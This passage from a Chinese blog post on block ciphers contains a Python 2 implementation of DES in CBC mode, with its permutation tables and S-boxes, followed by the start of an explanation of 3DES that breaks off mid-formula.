class="line"></span><br><span class="line">ENCRYPT = <span class="number">0</span></span><br><span class="line">DECRYPT = <span class="number">1</span></span><br><span class="line">BLOCK_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 明文分组初始置换表</span></span><br><span class="line">IP = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>,</span><br><span class="line">      <span class="number">8</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line"><span class="comment"># 末置换表</span></span><br><span class="line">IP_ = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>,</span><br><span class="line">       <span class="number">29</span>, <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>, <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># S盒压缩置换表（6bit-&gt;4bit）</span></span><br><span class="line">S1 = [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">8</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">S2 = [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>,</span><br><span class="line">      <span class="number">5</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">S3 = [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line">S4 = [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,</span><br><span class="line">      <span class="number">9</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">S5 = [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">S6 = [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">8</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">S7 = [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">S8 = [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">      <span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">S = [S1, S2, S3, S4, S5, S6, S7, S8]</span><br><span class="line"></span><br><span class="line"><span class="comment"># P盒置换表（32bit）</span></span><br><span class="line">P = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>,</span><br><span class="line">     <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥置换表（64bit-&gt;56bit）</span></span><br><span class="line">PC_1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line"><span class="comment"># 密钥压缩置换表（56bit-&gt;48bit）</span></span><br><span class="line">PC_2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">        <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 明文扩展置换表（32bit-&gt;48bit）</span></span><br><span class="line">E = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">16</span>,</span><br><span class="line">     <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 子密钥循环左移位数表（16次）</span></span><br><span class="line">SHIFT = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">sub_keys = [[<span class="number">0</span>] * <span class="number">48</span>] * <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_string_to_bitlist</span><span class="params">(string)</span>:</span></span><br><span class="line">    data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> string]</span><br><span class="line">    l = len(data) * <span class="number">8</span></span><br><span class="line">    result = [<span class="number">0</span>] * l</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">        i = <span class="number">7</span></span><br><span class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> ch &amp; (<span class="number">1</span> &lt;&lt; i) != <span class="number">0</span>:</span><br><span class="line">                result[pos] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result[pos] = <span class="number">0</span></span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_bitlist_to_string</span><span class="params">(bitlist)</span>:</span></span><br><span class="line">    result = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> pos &lt; len(bitlist):</span><br><span class="line">        c += bitlist[pos] &lt;&lt; (<span class="number">7</span> - pos % <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> pos % <span class="number">8</span> == <span class="number">7</span>:</span><br><span class="line">            result.append(c)</span><br><span class="line">            c = <span class="number">0</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> result])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permute</span><span class="params">(table, block)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> list(map(<span class="keyword">lambda</span> x: block[x - <span class="number">1</span>], table))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_sub_keys</span><span class="params">(key)</span>:</span></span><br><span class="line">    key = permute(PC_1, convert_string_to_bitlist(key))</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    lkey = key[:<span class="number">28</span>]</span><br><span class="line">    rkey = key[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt; SHIFT[i]:</span><br><span class="line">            lkey.append(lkey[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">del</span> lkey[<span class="number">0</span>]</span><br><span class="line">            rkey.append(rkey[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">del</span> rkey[<span class="number">0</span>]</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        sub_keys[i] = permute(PC_2, lkey + rkey)</span><br><span class="line">        <span class="comment"># print sub_keys[i]</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_cipher</span><span class="params">(block, choice)</span>:</span></span><br><span class="line">    block = permute(IP, block)</span><br><span class="line">    lblock = block[:<span class="number">32</span>]</span><br><span class="line">    rblock = block[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">if</span> choice == ENCRYPT:</span><br><span class="line">        iteration = <span class="number">0</span></span><br><span class="line">        iteration_adjustment = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> choice == DECRYPT:</span><br><span class="line">        iteration = <span class="number">15</span></span><br><span class="line">        iteration_adjustment = <span class="number">-1</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 16轮F函数</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        rtemp = rblock[:]</span><br><span class="line">        <span class="comment"># 将右半块32位扩展为48位</span></span><br><span class="line">        rblock = permute(E, rblock)</span><br><span class="line">        <span class="comment"># 将扩展后的右半块和轮密钥进行逐位异或</span></span><br><span class="line">        rblock = list(map(<span class="keyword">lambda</span> x, y: x ^ y, rblock, sub_keys[iteration]))</span><br><span class="line">        b = [rblock[:<span class="number">6</span>], rblock[<span class="number">6</span>:<span class="number">12</span>], rblock[<span class="number">12</span>:<span class="number">18</span>], rblock[<span class="number">18</span>:<span class="number">24</span>],</span><br><span class="line">             rblock[<span class="number">24</span>:<span class="number">30</span>], rblock[<span class="number">30</span>:<span class="number">36</span>], rblock[<span class="number">36</span>:<span class="number">42</span>], rblock[<span class="number">42</span>:]]</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        bn = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line">        pos = <span class="number">0</span></span><br><span class="line">        <span class="comment"># S盒置换</span></span><br><span class="line">        <span class="keyword">while</span> j &lt; <span class="number">8</span>:</span><br><span class="line">            row = (b[j][<span class="number">0</span>] &lt;&lt; <span class="number">1</span>) + b[j][<span class="number">5</span>]</span><br><span class="line">            col = (b[j][<span class="number">1</span>] &lt;&lt; <span class="number">3</span>) + (b[j][<span class="number">2</span>] &lt;&lt; <span class="number">2</span>) + (b[j][<span class="number">3</span>] &lt;&lt; <span class="number">1</span>) + b[j][<span class="number">4</span>]</span><br><span class="line">            v = S[j][(<span class="number">16</span> * row) + col]</span><br><span class="line">            bn[pos] = (v &amp; <span class="number">8</span>) &gt;&gt; <span class="number">3</span></span><br><span class="line">            bn[pos + <span class="number">1</span>] = (v &amp; <span class="number">4</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">            bn[pos + <span class="number">2</span>] = (v &amp; <span class="number">2</span>) &gt;&gt; <span class="number">1</span></span><br><span class="line">            bn[pos + <span class="number">3</span>] = v &amp; <span class="number">1</span></span><br><span class="line">            pos += <span class="number">4</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 与P盒进行置换</span></span><br><span class="line">        rblock = permute(P, bn)</span><br><span class="line">        rblock = list(map(<span class="keyword">lambda</span> x, y: x ^ y, rblock, lblock))</span><br><span class="line">        lblock = rtemp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        iteration += iteration_adjustment</span><br><span class="line">    final = permute(IP_, rblock + lblock)</span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cipher</span><span class="params">(data, key, iv, choice)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(data) % BLOCK_SIZE != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"Data length illegal."</span>)</span><br><span class="line">    <span class="keyword">if</span> len(key) != <span class="number">8</span> <span class="keyword">or</span> len(iv) != <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"key/iv\'s length should be 8."</span>)</span><br><span class="line">    create_sub_keys(key)</span><br><span class="line">    iv = convert_string_to_bitlist(iv)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> i &lt; len(data):</span><br><span class="line">        block = convert_string_to_bitlist(data[i:i + <span class="number">8</span>])</span><br><span class="line">        <span class="keyword">if</span> choice == ENCRYPT:</span><br><span class="line">            block = list(map(<span class="keyword">lambda</span> x, y: x ^ y, block, iv))</span><br><span class="line">            block = des_cipher(block, choice)</span><br><span class="line">            iv = block</span><br><span class="line">        <span class="keyword">elif</span> choice == DECRYPT:</span><br><span class="line">            temp = block[:]</span><br><span class="line">            block = des_cipher(block, choice)</span><br><span class="line">            block = list(map(<span class="keyword">lambda</span> x, y: x ^ y, block, iv))</span><br><span class="line">            iv = temp</span><br><span class="line">        result.append(convert_bitlist_to_string(block))</span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    key = <span class="string">'#qianfei'</span></span><br><span class="line">    iv = <span class="string">'0'</span> * <span class="number">8</span></span><br><span class="line">    data = <span class="string">'#qianfei11111111'</span></span><br><span class="line">    ciphertext = cipher(data, key, iv, ENCRYPT)</span><br><span class="line">    <span class="comment"># print [ord(c) for c in ciphertext]</span></span><br><span class="line">    <span class="keyword">print</span> ciphertext</span><br><span class="line">    plaintext = cipher(ciphertext, key, iv, DECRYPT)</span><br><span class="line">    <span class="comment"># print [ord(c) for c in plaintext]</span></span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br></pre></td></tr></table></figure><h1 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h1><p>密码学中，三重数据加密算法（英语：Triple Data Encryption Algorithm，缩写为 TDEA，Triple DEA），或称 3DES（Triple DES），是一种对称密钥加密块密码，相当于是对每个数据块应用三次数据加密标准（DES）算法。由于计算机运算能力的增强，原版 DES 密码的密钥长度变得容易被暴力破解；3DES 即是设计用来提供一种相对简单的方法，即通过增加 DES 的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。</p><h2 id="算法流程-1"><a href="#算法流程-1" class="headerlink" title="算法流程"></a>算法流程</h2><p>三重 DES 的本质上就是经过了三次 DES 操作，密钥长度为 24 字节，拆分为三个长为 8 字节的密钥，加密时依次对明文进行加密、解密、加密的操作，解密时相反。具体如下：</p><p>$$<br>Ciphertext = E_{K3}(D_{K2}(E_{K1}(Plaintext))) \<br>Plaintext = 